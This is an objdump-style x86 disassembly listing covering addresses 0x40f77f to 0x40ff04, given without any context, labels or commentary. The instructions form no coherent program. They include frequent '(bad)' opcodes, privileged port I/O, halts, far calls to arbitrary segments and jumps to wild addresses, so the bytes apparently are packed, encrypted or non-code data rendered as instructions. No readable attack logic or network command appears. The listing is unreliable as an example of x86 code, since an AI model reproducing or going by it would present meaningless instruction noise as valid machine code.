  40f77f:	or     cl,bh
  40f781:	sub    BYTE PTR [esi],cl
  40f783:	sahf   
  40f784:	dec    ebp
  40f785:	push   eax
  40f786:	inc    eax
  40f787:	sub    dh,ah
  40f789:	inc    esi
  40f78a:	add    bl,BYTE PTR [edx]
  40f78c:	and    al,0x9b
  40f78e:	push   edi
  40f78f:	pop    es
  40f790:	sbb    bl,BYTE PTR [eax]
  40f792:	retf   0x51cc
  40f795:	mov    edx,0xf4214c14
  40f79a:	dec    ecx
  40f79b:	add    ebx,DWORD PTR [eax]
  40f79d:	jae    0x40f741
  40f79f:	fbld   TBYTE PTR [edi]
  40f7a1:	es cwde 
  40f7a3:	pop    edi
  40f7a4:	mov    DWORD PTR [ecx],edx
  40f7a6:	mov    ?,WORD PTR gs:[ecx-0x34]
  40f7aa:	pop    ds
  40f7ab:	add    DWORD PTR ds:0x59fa62a0,ebp
  40f7b1:	popa   
  40f7b2:	xor    eax,0xe9a10800
  40f7b7:	aaa    
  40f7b8:	shl    BYTE PTR [ecx-0x323643d],cl
  40f7be:	clc    
  40f7bf:	cs adc eax,0x983bd796
  40f7c5:	shl    BYTE PTR [eiz*8+0x7102ee77],1
  40f7cc:	imul   esi,DWORD PTR [ecx],0xb34e746a
  40f7d2:	pop    edx
  40f7d3:	jns    0x40f79d
  40f7d5:	adc    al,0xa3
  40f7d7:	add    BYTE PTR ds:0x5abc6689,cl
  40f7dd:	pop    es
  40f7de:	cld    
  40f7df:	cdq    
  40f7e0:	in     al,dx
  40f7e1:	bound  eax,QWORD PTR [ebx]
  40f7e3:	fstp   TBYTE PTR [eax]
  40f7e5:	mov    esp,DWORD PTR [ebp+eax*4+0x7b78b1b8]
  40f7ec:	enter  0x84de,0x6a
  40f7f0:	nop
  40f7f1:	and    BYTE PTR [ebx+0x402713a9],dh
  40f7f7:	push   cs
  40f7f8:	jp     0x40f784
  40f7fa:	xchg   ebx,eax
  40f7fb:	cmc    
  40f7fc:	inc    eax
  40f7fd:	stc    
  40f7fe:	lods   al,BYTE PTR ds:[esi]
  40f7ff:	retf   0x71df
  40f802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f803:	pop    esi
  40f804:	adc    edx,esi
  40f806:	jnp    0x40f844
  40f808:	xchg   ecx,eax
  40f809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f80a:	and    bh,ah
  40f80c:	dec    edi
  40f80d:	in     eax,dx
  40f80e:	xor    eax,0x62b3a835
  40f813:	adc    ah,BYTE PTR [esi+0x19e830ff]
  40f819:	inc    edx
  40f81a:	add    DWORD PTR [eax],eax
  40f81c:	jmp    0x40fd27
  40f821:	ds ret 
  40f823:	enter  0xd13c,0xd3
  40f827:	rol    cl,cl
  40f829:	pop    ebx
  40f82a:	xor    ebp,DWORD PTR [edi+ebx*4+0x92bfe2f]
  40f831:	push   edx
  40f832:	pop    ebx
  40f833:	js     0x40f8ad
  40f835:	push   0x7c
  40f837:	js     0x40f8b1
  40f839:	adc    eax,0x60ffc3c1
  40f83e:	aas    
  40f83f:	push   esp
  40f840:	das    
  40f841:	and    eax,0x9b75dcb0
  40f846:	xchg   esi,eax
  40f847:	xor    eax,ecx
  40f849:	imul   ebp,DWORD PTR [ebp-0x7f],0x5258d15
  40f850:	jb     0x40f84c
  40f852:	cli    
  40f853:	pop    ss
  40f854:	mov    cl,ah
  40f856:	adc    ch,dh
  40f858:	popa   
  40f859:	gs push es
  40f85b:	xchg   ebp,eax
  40f85c:	sub    edx,DWORD PTR [ebx+0x70]
  40f85f:	mov    ecx,0xf03f1a44
  40f864:	sub    DWORD PTR [ebx-0x39ede504],0x8d55f277
  40f86e:	pop    edi
  40f86f:	cs jne 0x40f847
  40f872:	jle    0x40f80a
  40f874:	cmp    DWORD PTR [eax],edi
  40f876:	pop    eax
  40f877:	scas   eax,DWORD PTR es:[edi]
  40f878:	jge    0x40f86d
  40f87a:	or     ch,BYTE PTR [ebx+0x59]
  40f87d:	fcom   QWORD PTR [edi]
  40f87f:	repz fistp WORD PTR [ebx+0x18c9a870]
  40f886:	dec    ecx
  40f887:	scas   al,BYTE PTR es:[edi]
  40f888:	cld    
  40f889:	sub    al,0x6a
  40f88b:	nop
  40f88c:	adc    esp,DWORD PTR [ecx-0x2f676d86]
  40f892:	sub    BYTE PTR [edx],dl
  40f894:	fwait
  40f895:	cmp    eax,0x4e57f5f3
  40f89a:	loopne 0x40f863
  40f89c:	mov    bl,0xf6
  40f89e:	outs   dx,BYTE PTR ds:[esi]
  40f89f:	sub    dh,0x12
  40f8a2:	shl    BYTE PTR [edi-0x33],0xf8
  40f8a6:	sti    
  40f8a7:	xor    ch,bh
  40f8a9:	cwde   
  40f8aa:	aam    0xef
  40f8ac:	gs into 
  40f8ae:	repnz xor al,0xea
  40f8b1:	jne    0x40f86c
  40f8b3:	push   0xffffffa1
  40f8b5:	lock xor ah,cl
  40f8b8:	aaa    
  40f8b9:	cmp    edx,DWORD PTR [eax-0xe]
  40f8bc:	mov    esi,0xc885430e
  40f8c1:	(bad)  
  40f8c2:	xchg   edx,eax
  40f8c3:	ret    0x4245
  40f8c6:	out    dx,eax
  40f8c7:	and    al,0xec
  40f8c9:	enter  0xea7e,0x4e
  40f8cd:	mov    ds:0xdd4272bb,eax
  40f8d2:	daa    
  40f8d3:	cmp    DWORD PTR [edi+eiz*1+0x3c179804],0xef929143
  40f8de:	pushf  
  40f8df:	mov    DWORD PTR [esi],ecx
  40f8e1:	mov    ebp,0xdfa8ecaa
  40f8e6:	fsub   DWORD PTR [eax]
  40f8e8:	add    eax,ebp
  40f8ea:	pop    ss
  40f8eb:	mov    ecx,0xe749d76f
  40f8f0:	xor    eax,0xfcccdb92
  40f8f5:	dec    ecx
  40f8f6:	adc    edi,DWORD PTR [ebp-0x2c11c58a]
  40f8fc:	shl    ebp,0x8f
  40f8ff:	mov    ds:0xf4ea8d62,al
  40f904:	add    al,0x1a
  40f906:	es ret 
  40f908:	sub    DWORD PTR [ebx],ebx
  40f90a:	sub    ebx,DWORD PTR [ecx+0x649a690f]
  40f910:	add    eax,0x88a7dfce
  40f915:	outs   dx,DWORD PTR ds:[esi]
  40f916:	mov    BYTE PTR [eax-0x1c78f036],al
  40f91c:	push   esp
  40f91d:	mov    ds:0x7e6f34fa,al
  40f922:	cld    
  40f923:	gs and al,al
  40f926:	cmp    ecx,esi
  40f928:	scas   eax,DWORD PTR es:[edi]
  40f929:	xor    bl,BYTE PTR [esi+0x276f856f]
  40f92f:	stos   BYTE PTR es:[edi],al
  40f930:	add    al,0x3c
  40f932:	fstp   QWORD PTR [eax]
  40f934:	mov    ebx,0xac32da8d
  40f939:	fdiv   DWORD PTR [ebp+0x3d]
  40f93c:	adc    bl,BYTE PTR [esi]
  40f93e:	lods   al,BYTE PTR ds:[esi]
  40f93f:	xchg   ebx,eax
  40f940:	pop    ecx
  40f941:	fcom   DWORD PTR [eax-0x55982c86]
  40f947:	jo     0x40f986
  40f949:	jle    0x40f975
  40f94b:	adc    eax,0x78deaab6
  40f950:	mov    WORD PTR [ebx],ss
  40f952:	cmc    
  40f953:	inc    ecx
  40f954:	dec    ecx
  40f955:	xor    edi,0xe9730f61
  40f95b:	(bad)  
  40f95c:	rcr    bh,0xa4
  40f95f:	xor    BYTE PTR [edi+0x2d31aa2],0xf8
  40f966:	jb     0x40f998
  40f968:	imul   edx,DWORD PTR [edi+eiz*8+0x14128ce],0x4728ca04
  40f973:	shl    DWORD PTR [ebp-0x30],1
  40f976:	xchg   edx,eax
  40f977:	jg     0x40f96a
  40f979:	shl    BYTE PTR ds:[eax+0x33],1
  40f97d:	and    BYTE PTR ds:0x942a549,bl
  40f983:	push   DWORD PTR [ecx+0x65]
  40f986:	pusha  
  40f987:	inc    ebp
  40f988:	int    0x45
  40f98a:	jmp    0x3c04e253
  40f98f:	add    bl,BYTE PTR [esi+0x6d055933]
  40f995:	dec    ebx
  40f996:	add    al,0x8b
  40f998:	shl    DWORD PTR [ecx],0xb8
  40f99b:	jno    0x40f96b
  40f99d:	loopne 0x40f9d1
  40f99f:	mov    WORD PTR [edi+edi*1-0x4e295d93],cs
  40f9a6:	push   ecx
  40f9a7:	popf   
  40f9a8:	(bad)  
  40f9a9:	sbb    cl,BYTE PTR [edi-0x13ca1bfa]
  40f9af:	jecxz  0x40fa2c
  40f9b1:	mov    esp,0x19fa25ad
  40f9b6:	outs   dx,DWORD PTR ds:[esi]
  40f9b7:	and    ecx,DWORD PTR [ebp-0x1dd14c80]
  40f9bd:	(bad)  
  40f9bf:	stos   BYTE PTR es:[edi],al
  40f9c0:	lods   al,BYTE PTR ds:[esi]
  40f9c1:	sar    BYTE PTR [edi-0x5e8db08],cl
  40f9c7:	pop    ecx
  40f9c8:	aad    0x7d
  40f9ca:	sub    DWORD PTR [eax+0x138b74f6],ebp
  40f9d0:	adc    esi,esi
  40f9d2:	jmp    0x34df6379
  40f9d7:	aad    0xd
  40f9d9:	adc    BYTE PTR [ebx+edi*4-0x4e307f54],bl
  40f9e0:	pop    ebp
  40f9e1:	cmc    
  40f9e2:	int    0x4c
  40f9e4:	sbb    al,0xec
  40f9e6:	in     al,dx
  40f9e7:	mov    ebp,0x75b7e58
  40f9ec:	and    eax,0xb86b0d6a
  40f9f1:	dec    ecx
  40f9f2:	int3   
  40f9f3:	das    
  40f9f4:	pop    ds
  40f9f5:	repz sub DWORD PTR [ebx-0x4],0x3b2786fd
  40f9fd:	jmp    0xf50e1c9a
  40fa02:	bound  ebx,QWORD PTR [edi]
  40fa04:	jmp    0xe7ca:0xbcf3f4ed
  40fa0b:	push   es
  40fa0c:	xchg   ebp,eax
  40fa0d:	in     eax,dx
  40fa0e:	aaa    
  40fa0f:	in     eax,0x78
  40fa11:	retf   0x8f60
  40fa14:	test   BYTE PTR [esp+ebx*4],ah
  40fa17:	pop    ebp
  40fa18:	les    edi,FWORD PTR [ebx]
  40fa1a:	inc    edi
  40fa1b:	mov    ecx,0x9b905f9
  40fa20:	add    al,0x61
  40fa22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa23:	and    eax,0xbdc4d3af
  40fa28:	adc    eax,0x6af24397
  40fa2d:	loope  0x40fa2d
  40fa2f:	mov    DWORD PTR [ecx],ecx
  40fa31:	and    ax,0x876b
  40fa35:	inc    eax
  40fa36:	push   es
  40fa37:	push   ss
  40fa38:	fiadd  WORD PTR [esi+0x73c47fc2]
  40fa3e:	in     eax,dx
  40fa3f:	mov    ecx,0x321c073
  40fa44:	mov    cl,0xf4
  40fa46:	cdq    
  40fa47:	je     0x40fa8d
  40fa49:	gs icebp 
  40fa4b:	jno    0x40fa8c
  40fa4d:	enter  0x6962,0xe6
  40fa51:	push   eax
  40fa52:	sbb    DWORD PTR [edx],0xffffff9d
  40fa55:	test   BYTE PTR [esp+edx*2-0x300209c8],al
  40fa5c:	hlt    
  40fa5d:	pop    es
  40fa5e:	mov    cl,0xcf
  40fa60:	pop    ss
  40fa61:	(bad)  
  40fa62:	fwait
  40fa63:	push   0x39c8166
  40fa68:	jle    0x40fa8d
  40fa6a:	dec    esi
  40fa6b:	ds mov ecx,eax
  40fa6e:	cmp    dh,0xd2
  40fa71:	das    
  40fa72:	or     ah,al
  40fa74:	or     bl,BYTE PTR [ebx]
  40fa76:	mul    DWORD PTR [esi+0x174c7802]
  40fa7c:	icebp  
  40fa7d:	jmp    0xc5d0d6a9
  40fa82:	test   DWORD PTR [ebp+0xde68247],ebx
  40fa88:	stos   BYTE PTR es:[edi],al
  40fa89:	and    dl,cl
  40fa8b:	push   esi
  40fa8c:	les    edx,FWORD PTR [esi-0x44]
  40fa8f:	cmc    
  40fa90:	dec    edi
  40fa91:	jge    0x40fa96
  40fa93:	dec    edi
  40fa94:	fst    DWORD PTR [eax]
  40fa96:	and    al,0xf0
  40fa98:	cwde   
  40fa99:	and    al,0x2f
  40fa9b:	stc    
  40fa9c:	pop    ebx
  40fa9d:	jl     0x40faa3
  40fa9f:	ds aad 0xeb
  40faa2:	int    0x91
  40faa4:	das    
  40faa5:	mov    eax,DWORD PTR [ebx]
  40faa7:	and    eax,0xb57baa1e
  40faac:	fwait
  40faad:	jo     0x40faef
  40faaf:	dec    edi
  40fab0:	cwde   
  40fab1:	or     eax,0x2fbaedce
  40fab6:	loopne 0x40fa3f
  40fab8:	out    0x2f,eax
  40faba:	aam    0x4f
  40fabc:	ror    BYTE PTR [edx+eiz*1+0x5d],1
  40fac0:	mov    bl,ch
  40fac2:	dec    edi
  40fac3:	inc    edi
  40fac4:	mov    bh,0x38
  40fac6:	call   0x3d2d123f
  40facb:	xor    edi,DWORD PTR [ebp-0x66]
  40face:	mov    al,0x1e
  40fad0:	popa   
  40fad1:	fs mov esi,0xbb3464ab
  40fad7:	pusha  
  40fad8:	(bad)  
  40fad9:	js     0x40fa69
  40fadb:	leave  
  40fadc:	dec    ah
  40fade:	sub    dl,BYTE PTR [ebp-0x17]
  40fae1:	out    0x62,eax
  40fae3:	loopne 0x40faae
  40fae5:	(bad)  
  40fae6:	ror    DWORD PTR [ebp+ebx*4+0x11],1
  40faea:	mov    es,WORD PTR [ebx+0x1120f478]
  40faf0:	dec    edx
  40faf1:	jbe    0x40faf9
  40faf3:	add    al,BYTE PTR [edx-0x4f]
  40faf6:	ins    DWORD PTR es:[edi],dx
  40faf7:	mov    bl,0xcd
  40faf9:	sti    
  40fafa:	mov    ch,BYTE PTR [edx+ebx*8]
  40fafd:	adc    BYTE PTR [edi+0x77502e13],0x71
  40fb04:	sbb    DWORD PTR [ebx-0x5610019d],esi
  40fb0a:	jae    0x40fac8
  40fb0c:	xchg   ebp,eax
  40fb0d:	repnz push ebx
  40fb0f:	sub    DWORD PTR [ebx+ebx*8+0x66],ecx
  40fb13:	mov    ebx,0xfca05590
  40fb18:	test   esp,0x2697e44f
  40fb1e:	loop   0x40fb6b
  40fb20:	outs   dx,BYTE PTR ds:[esi]
  40fb21:	and    al,BYTE PTR [ecx+ebp*4+0x2dab4ab4]
  40fb28:	shr    DWORD PTR [ebp+0x58],1
  40fb2b:	jae    0x40faed
  40fb2d:	test   BYTE PTR [ebx+0x62ae89ce],al
  40fb33:	pop    esp
  40fb34:	loopne 0x40fb7b
  40fb36:	pop    ebx
  40fb37:	cmc    
  40fb38:	sbb    ebp,ebx
  40fb3a:	pop    ebp
  40fb3b:	adc    al,0x35
  40fb3d:	shl    BYTE PTR [ebx],cl
  40fb3f:	sub    eax,eax
  40fb41:	loopne 0x40fb88
  40fb43:	fadd   DWORD PTR [eax]
  40fb45:	test   eax,0x849237b1
  40fb4a:	push   ss
  40fb4b:	fsub   QWORD PTR [esp+edx*4-0x6]
  40fb4f:	clc    
  40fb50:	mov    edx,ebp
  40fb52:	mov    ds:0xa367529e,eax
  40fb57:	ds mov edx,0x4cfdd16c
  40fb5d:	jae    0x40fba4
  40fb5f:	jl     0x40fbba
  40fb61:	cmp    BYTE PTR [edi+0x4b],0x36
  40fb65:	xor    al,0x92
  40fb67:	xchg   DWORD PTR [edx+esi*8+0xd606e57],ecx
  40fb6e:	pop    es
  40fb6f:	cmp    ebx,eax
  40fb71:	ds sahf 
  40fb73:	pop    edx
  40fb74:	pop    ds
  40fb75:	mov    esp,0x8206f430
  40fb7a:	push   ds
  40fb7b:	ds pop esp
  40fb7d:	mov    ch,0xae
  40fb7f:	mov    eax,0x6a89adfb
  40fb84:	int    0x43
  40fb86:	and    al,0xa7
  40fb88:	jle    0x40fb38
  40fb8a:	adc    DWORD PTR [eax+edx*1-0xee9ebad],eax
  40fb91:	add    DWORD PTR [ebx-0x252867cf],ecx
  40fb97:	or     al,0x9b
  40fb99:	nop
  40fb9a:	cmp    al,0xa3
  40fb9c:	fcomp  st(6)
  40fb9e:	dec    ebp
  40fb9f:	dec    edi
  40fba0:	cs in  al,dx
  40fba2:	push   ebp
  40fba3:	and    al,0xfb
  40fba5:	call   0x51e4:0x9d911818
  40fbac:	lahf   
  40fbad:	push   ebx
  40fbae:	push   edi
  40fbaf:	and    bh,BYTE PTR [esi+0xd383a4d]
  40fbb5:	scas   al,BYTE PTR es:[edi]
  40fbb6:	inc    ecx
  40fbb7:	mov    ebp,0x22869860
  40fbbc:	xchg   edi,eax
  40fbbd:	jae    0x40fc34
  40fbbf:	sbb    bh,bl
  40fbc1:	mov    ch,0x8b
  40fbc3:	aaa    
  40fbc4:	daa    
  40fbc5:	and    al,0x74
  40fbc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc8:	stc    
  40fbc9:	jns    0x40fbf5
  40fbcb:	xor    ecx,edx
  40fbcd:	xchg   esi,eax
  40fbce:	mov    edx,0xaeeb424e
  40fbd3:	and    DWORD PTR [edi-0x2c8dce0],esp
  40fbd9:	ins    DWORD PTR es:[edi],dx
  40fbda:	inc    ecx
  40fbdb:	scas   eax,DWORD PTR es:[edi]
  40fbdc:	or     bl,BYTE PTR [eax+0x19]
  40fbdf:	sbb    DWORD PTR [ecx-0x6b8b3d08],ebx
  40fbe5:	mov    esp,0x94773009
  40fbea:	pop    esp
  40fbeb:	and    BYTE PTR [ecx+0x4e5805b],0x75
  40fbf2:	pop    eax
  40fbf3:	cli    
  40fbf4:	jae    0x40fbdd
  40fbf6:	adc    BYTE PTR [ebx+0x2744accc],ch
  40fbfc:	daa    
  40fbfd:	call   0xe0f0:0xcb96c6d5
  40fc04:	sar    al,0x30
  40fc07:	int    0x6a
  40fc09:	es jp  0x40fbf2
  40fc0c:	jmp    0x40fbc6
  40fc0e:	imul   ebp,ebp,0x5dc72d45
  40fc14:	push   ebp
  40fc15:	fcom   DWORD PTR [ebp+0x4bba3ae6]
  40fc1b:	lea    ecx,[esi-0x20]
  40fc1e:	fild   DWORD PTR [ebx+0x7b274497]
  40fc24:	mov    ds:0xb3d96d13,eax
  40fc29:	pop    edi
  40fc2a:	jg     0x40fbae
  40fc2c:	xchg   ebp,eax
  40fc2d:	xchg   esp,eax
  40fc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc30:	shr    cl,cl
  40fc32:	std    
  40fc33:	sub    edx,eax
  40fc35:	aad    0x5d
  40fc37:	call   0x7b69:0xca90c47e
  40fc3e:	loopne 0x40fc6a
  40fc40:	dec    eax
  40fc41:	stos   DWORD PTR es:[edi],eax
  40fc42:	xchg   esp,eax
  40fc43:	fmul   st(3),st
  40fc45:	adc    eax,0xd883ed91
  40fc4a:	out    0x34,eax
  40fc4c:	nop
  40fc4d:	out    0xe2,al
  40fc4f:	add    eax,0x149c13e
  40fc54:	xchg   ebp,eax
  40fc55:	add    BYTE PTR [eax],al
  40fc57:	ds (bad) 
  40fc59:	(bad)  [esi+eiz*4]
  40fc5c:	xchg   edx,eax
  40fc5d:	pop    ecx
  40fc5e:	(bad)  
  40fc5f:	mov    edx,0x76869653
  40fc64:	std    
  40fc65:	add    al,0xdb
  40fc67:	mov    ebp,0x71917b02
  40fc6c:	inc    DWORD PTR [edi+0x570a04fb]
  40fc72:	lock sub sp,WORD PTR [ecx+ebx*2-0x5]
  40fc78:	cli    
  40fc79:	jnp    0x40fc45
  40fc7b:	jmp    0x40fc42
  40fc7d:	sbb    al,0xa1
  40fc7f:	lods   eax,DWORD PTR ds:[esi]
  40fc80:	enter  0xc39a,0x46
  40fc84:	out    dx,eax
  40fc85:	jge    0x40fd03
  40fc87:	mov    bl,0x5d
  40fc89:	mov    esi,0xaf6eaec0
  40fc8e:	xchg   ebx,eax
  40fc8f:	lods   al,BYTE PTR ds:[esi]
  40fc90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc91:	push   esi
  40fc92:	addr16 jmp 0x430c:0x1bb98831
  40fc9a:	into   
  40fc9b:	push   eax
  40fc9c:	loopne 0x40fcc3
  40fc9e:	test   BYTE PTR [edx+0x36],cl
  40fca1:	jle    0x40fc50
  40fca3:	dec    eax
  40fca4:	iret   
  40fca5:	in     eax,0x41
  40fca7:	xor    al,0x76
  40fca9:	out    0x1c,al
  40fcab:	mov    esp,DWORD PTR [esi-0x47c0d421]
  40fcb1:	scas   al,BYTE PTR es:[edi]
  40fcb2:	sbb    DWORD PTR [ecx+0x7cde4604],esi
  40fcb8:	add    DWORD PTR ds:0x17f8be3b,ecx
  40fcbe:	lods   eax,DWORD PTR ds:[esi]
  40fcbf:	stos   DWORD PTR es:[edi],eax
  40fcc0:	adc    al,0x6a
  40fcc2:	mov    DWORD PTR [eax+0x42],ebx
  40fcc5:	mov    ?,WORD PTR [esi]
  40fcc7:	xor    DWORD PTR [ebx],edx
  40fcc9:	mov    eax,ds:0xe8ffa720
  40fcce:	ficomp WORD PTR [ebp+0x3c]
  40fcd1:	push   ebp
  40fcd2:	aas    
  40fcd3:	adc    BYTE PTR [ecx+0x28],bl
  40fcd6:	out    dx,eax
  40fcd7:	jle    0x40fce0
  40fcd9:	mov    eax,ds:0x2e80d7fb
  40fcde:	cmp    dl,ch
  40fce0:	pop    ebp
  40fce1:	mov    ecx,0x6628000d
  40fce6:	cwde   
  40fce7:	pop    ecx
  40fce8:	inc    edx
  40fce9:	dec    BYTE PTR [ebx]
  40fceb:	mov    ds:0xf17f42b5,eax
  40fcf1:	mov    bl,dl
  40fcf3:	in     al,dx
  40fcf4:	dec    esp
  40fcf5:	inc    eax
  40fcf6:	ja     0x40fce9
  40fcf8:	jp     0x40fcef
  40fcfa:	gs inc edx
  40fcfc:	add    al,0x5c
  40fcfe:	sbb    dl,0x59
  40fd01:	in     eax,dx
  40fd02:	push   ebx
  40fd03:	push   edi
  40fd04:	sbb    DWORD PTR [ebx],esp
  40fd06:	mov    edi,eax
  40fd08:	sub    dl,BYTE PTR [eax+0x70b8254d]
  40fd0e:	(bad)  
  40fd0f:	push   ebx
  40fd10:	xchg   esi,eax
  40fd11:	ss sbb esp,ebp
  40fd14:	out    0x10,al
  40fd16:	or     DWORD PTR [ecx-0x3020ecd7],edi
  40fd1c:	js     0x40fca9
  40fd1e:	add    ecx,ecx
  40fd20:	xlat   BYTE PTR ds:[ebx]
  40fd21:	mov    es,eax
  40fd23:	loope  0x40fcc4
  40fd25:	dec    ebx
  40fd26:	test   BYTE PTR [ebx+0x6e9d84d],0x5
  40fd2d:	add    BYTE PTR [eax],al
  40fd2f:	int3   
  40fd30:	ds into 
  40fd32:	(bad)  
  40fd33:	rcl    dh,cl
  40fd35:	aam    0xca
  40fd37:	xchg   DWORD PTR [ebx-0x1d],esi
  40fd3a:	(bad)  
  40fd3c:	push   cs
  40fd3d:	jp     0x40fcf9
  40fd3f:	mov    esp,0x6a78785e
  40fd44:	jl     0x40fdbe
  40fd46:	js     0x40fd12
  40fd48:	ja     0x40fd2c
  40fd4a:	cli    
  40fd4b:	lock mov bh,0x60
  40fd4e:	mov    eax,ds:0x3af967b8
  40fd53:	push   es
  40fd54:	imul   eax,DWORD PTR [eax],0x6b86b4bd
  40fd5a:	test   DWORD PTR [ebx+0x1b],eax
  40fd5d:	inc    esi
  40fd5e:	inc    edx
  40fd5f:	call   0xe801:0xa4734163
  40fd66:	inc    edi
  40fd67:	jle    0x40fdb2
  40fd69:	aas    
  40fd6a:	cdq    
  40fd6b:	fadd   QWORD PTR [esi]
  40fd6d:	cs push ds
  40fd6f:	pop    edx
  40fd70:	stc    
  40fd71:	(bad)  
  40fd72:	jno    0x40fd02
  40fd74:	xchg   ecx,eax
  40fd75:	inc    esp
  40fd76:	xor    bl,BYTE PTR [ebx+edi*2]
  40fd79:	xchg   ebp,eax
  40fd7a:	mov    edx,0x7d48676e
  40fd7f:	fadd   QWORD PTR [ebx]
  40fd81:	jnp    0x40fdad
  40fd83:	push   ds
  40fd84:	call   0x2e73a5cf
  40fd89:	xchg   ebp,eax
  40fd8a:	mov    DWORD PTR [eax+0x3c7cf5c4],edi
  40fd90:	(bad)  
  40fd91:	imul   ebx,DWORD PTR [bx+di],0x7b523d
  40fd98:	mov    eax,ds:0xac2a64d8
  40fd9d:	mov    WORD PTR [esi+edx*2-0x21],fs
  40fda1:	icebp  
  40fda2:	mov    ecx,0x89e21575
  40fda7:	ror    DWORD PTR [edx-0x36f5543f],1
  40fdad:	test   eax,0x4d925bec
  40fdb2:	daa    
  40fdb3:	and    eax,0xc0f135ec
  40fdb8:	repz in al,dx
  40fdba:	cmp    DWORD PTR [ebp+0x1b],ecx
  40fdbd:	shl    DWORD PTR [ecx+0x59],cl
  40fdc0:	(bad)  
  40fdc1:	out    0x35,al
  40fdc3:	mov    ds:0x6387ff3b,eax
  40fdc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdc9:	inc    eax
  40fdca:	dec    edx
  40fdcb:	adc    bh,BYTE PTR [esi+eax*1-0x697e3913]
  40fdd2:	and    al,0xb4
  40fdd4:	jno    0x40fdbb
  40fdd6:	lods   al,BYTE PTR ds:[esi]
  40fdd7:	mov    WORD PTR [esp+ecx*4+0x1c],gs
  40fddb:	(bad)  
  40fddc:	es cmp eax,0x76bee1ee
  40fde2:	stc    
  40fde3:	into   
  40fde4:	ss stos DWORD PTR es:[edi],eax
  40fde6:	pushf  
  40fde7:	pop    eax
  40fde8:	popf   
  40fde9:	sbb    al,0x62
  40fdeb:	shr    DWORD PTR [ebx-0x11ff7562],cl
  40fdf1:	mov    edx,0x9643c3d6
  40fdf6:	sbb    cl,BYTE PTR [ebx]
  40fdf8:	daa    
  40fdf9:	inc    edx
  40fdfa:	fild   WORD PTR [esi-0x8dd4353]
  40fe00:	loop   0x40fe63
  40fe02:	test   DWORD PTR [ebx+eax*2-0x5c1aded9],esi
  40fe09:	and    DWORD PTR [edi],esi
  40fe0b:	shr    bh,1
  40fe0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe0e:	call   0x4ac2231
  40fe13:	sar    DWORD PTR [edi],cl
  40fe15:	jo     0x40fe42
  40fe17:	push   ss
  40fe18:	pop    ss
  40fe19:	test   DWORD PTR [edx+0x6aa98b94],0xeb0d3933
  40fe23:	mov    al,0xf7
  40fe25:	adc    eax,0x6dd45d5f
  40fe2a:	or     DWORD PTR [ebx],0xbec18708
  40fe30:	mov    eax,0xa2c23114
  40fe35:	mov    edx,0x58fbd21a
  40fe3a:	xchg   ebp,eax
  40fe3b:	jl     0x40fdd8
  40fe3d:	in     eax,dx
  40fe3e:	push   edx
  40fe3f:	cmc    
  40fe40:	mov    WORD PTR [edi-0x1c9fa42d],?
  40fe46:	inc    ebx
  40fe47:	rcl    DWORD PTR [ebx-0x33],cl
  40fe4a:	push   eax
  40fe4b:	push   0x1f
  40fe4d:	mov    dh,0xe4
  40fe4f:	je     0x40fde4
  40fe51:	xchg   edx,eax
  40fe52:	jg     0x40fe66
  40fe54:	pop    edx
  40fe55:	(bad)
  40fe58:	sub    edx,esi
  40fe5a:	dec    edx
  40fe5b:	out    dx,eax
  40fe5c:	sub    al,bh
  40fe5e:	stc    
  40fe5f:	push   eax
  40fe60:	clc    
  40fe61:	add    BYTE PTR [ebx],al
  40fe63:	pop    eax
  40fe64:	jns    0x40fe46
  40fe66:	xchg   edx,eax
  40fe67:	mov    ds:0x23e06643,al
  40fe6c:	or     BYTE PTR [esi+eax*1-0x57],dl
  40fe70:	adc    ebp,DWORD PTR [eax]
  40fe72:	pop    ecx
  40fe73:	mov    bh,0x39
  40fe75:	sar    ebx,1
  40fe77:	imul   edx,DWORD PTR [eax+0x61],0x1d1e2076
  40fe7e:	neg    ebp
  40fe80:	popf   
  40fe81:	aam    0x9b
  40fe83:	mov    eax,0xf4864eab
  40fe88:	jecxz  0x40fe8e
  40fe8a:	hlt    
  40fe8b:	or     eax,0xa967512a
  40fe90:	out    0xa3,eax
  40fe92:	inc    ebp
  40fe93:	out    dx,al
  40fe94:	fsub   st(5),st
  40fe96:	fisttp WORD PTR [edi]
  40fe98:	test   bl,bl
  40fe9a:	aad    0xc4
  40fe9c:	push   edx
  40fe9d:	xlat   BYTE PTR ds:[ebx]
  40fe9e:	icebp  
  40fe9f:	mov    esp,0xa83dea8a
  40fea4:	pop    ebp
  40fea5:	push   ecx
  40fea6:	fwait
  40fea7:	loopne 0x40fe3f
  40fea9:	shr    BYTE PTR ds:0x456cc970,0xf2
  40feb0:	inc    ecx
  40feb1:	inc    edx
  40feb2:	gs add eax,0xcfedfdd3
  40feb8:	pop    ebx
  40feb9:	cmc    
  40feba:	sub    ecx,DWORD PTR [ebx]
  40febc:	xchg   ebx,eax
  40febd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40febe:	into   
  40febf:	dec    eax
  40fec0:	inc    esp
  40fec1:	(bad)  
  40fec2:	or     ebp,ecx
  40fec4:	sub    eax,0x44963883
  40fec9:	test   al,0xfc
  40fecb:	jb     0x40ff44
  40fecd:	inc    ebp
  40fece:	sahf   
  40fecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fed0:	in     al,dx
  40fed1:	stc    
  40fed2:	std    
  40fed3:	push   ebx
  40fed4:	iret   
  40fed5:	sub    edi,ecx
  40fed7:	mov    DWORD PTR [eax-0x28],0x54383c
  40fede:	push   esp
  40fedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fee0:	mov    BYTE PTR [edx-0x733874a5],dh
  40fee6:	jmp    0x40fe78
  40fee8:	mov    al,ds:0xbcb1e98c
  40feed:	ret    
  40feee:	jmp    0x1a1cf70b
  40fef3:	popa   
  40fef4:	inc    ecx
  40fef5:	scas   al,BYTE PTR es:[edi]
  40fef6:	or     eax,0x12f92458
  40fefb:	les    ebx,FWORD PTR [edi]
  40fefd:	mov    eax,ds:0x8366346e
  40ff02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff03:	inc    edx
  40ff04:	cwde   
